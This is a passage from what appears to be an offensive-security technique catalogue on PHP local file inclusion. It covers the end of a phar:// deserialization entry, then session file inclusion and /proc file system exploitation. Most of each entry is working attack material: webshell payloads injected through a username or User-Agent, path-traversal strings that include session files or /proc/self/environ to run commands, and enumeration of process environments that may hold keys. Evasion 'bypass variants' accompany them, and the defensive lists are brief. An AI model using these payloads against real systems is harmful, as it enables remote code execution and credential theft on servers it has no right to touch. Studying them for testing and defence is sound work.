**Vulnerability Principle:** phar:// can not only include a PHP file inside an archive like zip://, but more critically, the metadata of a phar file is automatically deserialized when processed by any file operation function (file_exists/is_dir, etc.), which can trigger a POP chain to execute arbitrary code.

**Exploitation Method:** Complete exploitation flow:
1. Find an exploitable class (gadget)
2. Create a malicious Phar file
3. Upload or construct the Phar
4. Trigger deserialization

**Defensive Measures:** Defenses:
1. Disable the phar extension
2. Filter the phar:// protocol
3. Validate files against an allowlist
4. Upgrade the PHP version

---

### Session File Inclusion  `lfi-session`
_Use Session files for LFI attacks_
Subcategory: **Session Inclusion** · tags: `lfi` `session` `file` `inclusion`

**Prerequisites:**
- An LFI vulnerability exists
- The Session content can be controlled
- The Session path is known

**Attack Chain:**

**1. Probe for the Session path**
> Probe for the Session storage path
```
# Linux default paths
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/var/lib/php7/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/c:/windows/temp/sess_[PHPSESSID]
```
**Syntax breakdown:**
- `sess_` — Session file prefix _value_
- `PHPSESSID` — Session ID value _value_

**2. Control the Session content**
> Control the Session content
```
# Control the Session via user input
# For example, username, personal bio, etc.
username: <?php system($_GET['c']); ?>

# Or via a Cookie
Set-Cookie: PHPSESSID=malicious
```
**Syntax breakdown:**
- `system()` — system command execution _function_

**3. Include the Session file**
> Include the Session file to execute code
```
# Include the Session file
?file=/var/lib/php/sessions/sess_abc123&c=id

# Or use a relative path
?file=../../../var/lib/php/sessions/sess_abc123&c=id
```
**Syntax breakdown:**
- `../` — path traversal _path_

**4. Session race condition**
> Exploit a Session race condition
```
# Exploit a Session race
# 1. Continuously write malicious code to the Session
# 2. Simultaneously include the Session file
# 3. Execute before the Session is cleaned up
```

**WAF/EDR Bypass Variants:**

**Session ID prediction**
> Predict the Session ID
```
# Try to predict the Session ID
# Common pattern: md5(ip.time.random)
# Brute-force enumerate the Session ID
```
**Syntax breakdown:**
- `#` — command/payload start _command_
- ` Try to predict the Session ID
# Common pattern: md5(ip.time.random)
# Brute-force enumerate the Session ID` — parameters and payload content _value_

**Overview:** Session file inclusion is an important technique for upgrading LFI to RCE. It injects malicious PHP code into a Session file, then includes the Session file via LFI to achieve code execution. The Session file path is usually predictable (such as /tmp/sess_PHPSESSID).

**Vulnerability Principle:** PHP Sessions are stored in the filesystem by default (/tmp/sess_xxx or /var/lib/php/sessions/sess_xxx). When the application stores user-controllable data (such as the username) in the Session, an attacker injects PHP code into the Session variable, then includes the corresponding Session file via LFI to trigger execution.

**Exploitation Method:** Complete exploitation flow:
1. Find the Session storage path
2. Control the Session content
3. Include the Session file
4. Execute code

**Defensive Measures:** Defenses:
1. Restrict the Session content
2. Use secure Session storage
3. Validate the filename against an allowlist
4. Disable file inclusion

---

### Proc File System Exploitation  `lfi-proc`
_Use the /proc file system for LFI attacks_
Subcategory: **Proc File System** · tags: `lfi` `proc` `linux` `environ`

**Prerequisites:**
- An LFI vulnerability exists
- Linux system
- /proc is accessible

**Attack Chain:**

**1. Read process information**
> Read current process information
_platform: linux_
```
# Current process information
/proc/self/cmdline
/proc/self/environ
/proc/self/cwd
/proc/self/exe
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```
**Syntax breakdown:**
- `/proc/self/` — current process directory _path_
- `cmdline` — startup command _value_
- `environ` — environment variables _value_
- `cwd` — current working directory _value_

**2. Read environment variables**
> Read environment variables to execute code
_platform: linux_
```
?file=../../../proc/self/environ

# Inject in the User-Agent
User-Agent: <?php system($_GET['c']); ?>

# Include to execute
?file=../../../proc/self/environ&c=id
```
**Syntax breakdown:**
- `system()` — system command execution _function_
- `../` — path traversal _path_

**3. Read logs via fd**
> Read logs via fd
_platform: linux_
```
# fd file descriptor
/proc/self/fd/10
/proc/self/fd/20

# Try different numbers to find the log
?file=../../../proc/self/fd/10
```
**Syntax breakdown:**
- `../` — path traversal _path_

**4. Read other processes**
> Read other process information
_platform: linux_
```
# Enumerate processes
/proc/[pid]/cmdline
/proc/[pid]/environ
/proc/[pid]/maps

# Brute-force enumerate
?file=../../../proc/1/cmdline
?file=../../../proc/2/cmdline
```
**Syntax breakdown:**
- `../` — path traversal _path_

**WAF/EDR Bypass Variants:**

**Use self**
> Use the self reference
_platform: linux_
```
?file=/proc/self/environ
?file=proc/self/environ
```
**Syntax breakdown:**
- `?file=/proc/self/environ
?file=proc/self/environ` — attack payload _value_

**Overview:** The /proc file system (a Linux virtual file system) contains a large amount of system runtime information. Reading the /proc directory via LFI can obtain process information, environment variables, network configuration, and so on, and /proc/self/environ can further be used for code execution.

**Vulnerability Principle:** Key files in the /proc file system: /proc/self/environ contains the current process's environment variables (may contain keys), /proc/self/cmdline contains the startup command, /proc/self/fd/N can read open file descriptors, /proc/net/tcp leaks network connection information and internal IPs.

**Exploitation Method:** Complete exploitation flow:
1. Probe for /proc accessibility
2. Read the environ file
3. Inject code into the User-Agent
4. Include to execute

**Defensive Measures:** Defenses:
1. Restrict /proc access
2. Validate the filename against an allowlist
3. Filter special characters
4. Use chroot isolation

---
